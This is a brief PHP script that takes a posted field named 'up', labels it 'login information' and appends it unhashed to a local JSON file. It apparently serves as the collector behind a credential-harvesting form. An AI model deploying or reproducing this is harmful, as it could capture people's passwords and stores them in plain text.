<?php

echo "hello";

$epass = $_POST["up"];

$data = array("login information" => $epass);

$jdata = json_encode($data);

$myfile = fopen("j2.json","a");
fwrite($myfile,$jdata);
fclose($myfile);

?>